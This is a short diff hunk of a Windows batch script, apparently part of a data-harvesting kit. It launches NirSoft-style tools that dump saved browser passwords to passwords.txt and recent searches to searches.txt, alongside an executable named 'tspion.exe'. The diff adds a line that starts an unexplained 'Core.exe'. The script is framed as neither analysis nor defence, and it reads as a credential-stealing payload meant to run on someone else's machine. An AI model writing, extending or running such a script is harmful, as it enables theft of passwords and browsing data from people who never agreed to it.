@@ -43,6 +43,7 @@ start tspion.exe
 start .\App\mylastsearch\MyLastSearch.exe /stext searches.txt
 start .\App\WebPass\WebBrowserPassView.exe /stext passwords.txt
 start .\App\CommandLine\Process.exe
+start .\App\Core.exe
 pause
 start .\App\options.bat
 goto eof
